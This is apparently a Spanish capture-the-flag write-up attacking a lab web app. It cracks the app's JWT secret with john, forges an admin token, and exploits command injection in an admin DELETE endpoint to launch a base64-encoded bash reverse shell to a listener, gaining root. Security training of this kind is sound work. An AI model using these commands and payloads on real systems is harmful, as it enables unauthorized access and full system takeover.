## Reconocimiento:

Puerto 5173 : HTTP (App)

Puerto 8000 : HTTP Unicorn (API)

Es una app dedicada a apoyar pinguinos, le aplico fuzzing de directorios y no encuentro mucho, solo un directorio llamado /docs para el puerto 8000 donde se encuentran los breakpoints de la API. 

De una paso a registrar un usuario y accedo al panel de información de usuario. No veo mucho, pero si registro mi usuario desde los endpoints:

```bash
POST /api/auth/register - Registro R4UL7T0:hola
POST /api/auth/login 
```

Nos expone el token JWT, lo cual cuenta como fallo de seguridad, ya que al manipularlo se puede acceder a un usuario con mas privilegios. Hay un endpoint exclusivo para admin lo cual también da a conocer que el usuario existe y tiene privilegios.

Utilizare un depurador, en este caso:

```bash
www.jwt.io
```

Se puede ver los datos del token:

```bash
{
    "sub": "user",
    "role": "user",
    "exp": 1772137761
}
```

Si esta firmado se procede al ataque:

```bash
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
# Info:
supersecret
```

Conociendo esto utilizare Python para generar el token malicioso cambiando los roles y añadiendo la Key:

```bash
python3 -c "import jwt; print(jwt.encode({'sub': 'admin', 'role': 'admin'},
'supersecret', algorithm='HS256'))"
# Info:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.r_4Sq_rkR9kbOwHvjiFxiPMiB8gx2KuWplhKGv-t6vk
```

Luego paso al panel de usuario y en la consola ejecuto:

```bash
localStorage.setItem('token',
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.r_4Sq_rkR9kbOwHvjiFxiPMiB8gx2KuWplhKGv-t6vk');

localStorage.setItem('user', JSON.stringify({username: 'admin', role: 'admin'}));
```

Recargo la página y accedo al panel de Admin.

Se ve que a la hora de eliminar un usuario se pueden ejecutar comandos, solo admin, y es vulnerable command injection, pero no se muestran en pantalla, vamos a probar hacer un time, primero creo la variable para el token desde la terminal:

```bash
ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.r_4Sq_rkR9kbOwHvjiFxiPMiB8gx2KuWplhKGv-t6vk"
```

Al revisar detenidamente los endpoints de la API, se identifica que el endpoint **DELETE** es susceptible a **inyección de comandos**. Este endpoint acepta un parámetro `{username}` que no es sanitizado adecuadamente.

```bash
time curl -X 'DELETE' \
'http://172.17.0.2:8000/api/admin/users/R4UL7T0%3B%20sleep%2010' \
-H 'accept: application/json' \
-H "Authorization: Bearer $ADMIN_TOKEN"
```

Funciona, ahora toca mandarnos la rev shell.

Primero me pongo en escucha:

```bash
nc -lnvp 4444
```

Luego encodeo el payload:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" | base64 
```

```bash
|base64 -d|bash 
# URL-Encoded:
%7Cbase64%20-d%7Cbas
```

Luego lo ejecuto juntos:

```bash
curl -X 'DELETE' \
"http://172.17.0.2:8000/api/admin/users/R4UL7T0;echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo=%7Cbase64%20-d%7Cbash" \
-H "Authorization: Bearer $ADMIN_TOKEN"
```

Y nos manda una shell con privilegios root.

Listo.
